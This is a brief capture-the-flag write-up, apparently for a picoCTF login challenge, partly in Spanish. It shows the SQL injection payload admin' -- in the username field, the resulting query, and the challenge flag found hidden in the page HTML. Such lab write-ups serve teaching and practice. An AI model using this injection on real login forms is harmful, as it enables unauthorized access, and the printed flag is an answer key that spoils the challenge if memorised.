
## Description

Can you login to this website?

Additional details will be available after launching your challenge instance.

## Hint

`admin` is the user you want to login as.

## Solution

Hacemos una pequeña inyección SQL en el campo USERNAME: admin' -- sin pornmer nada en el campo PASSWORD.

```
username: admin' --
password: 
SQL query: SELECT * FROM users WHERE name='admin' --' AND password=''

# Logged in! But can you see the flag, it is in plainsight.


Inspeccionamos el código del html, y ahí se encuantra la flag.


/pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}</p>


flag -> picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}
```


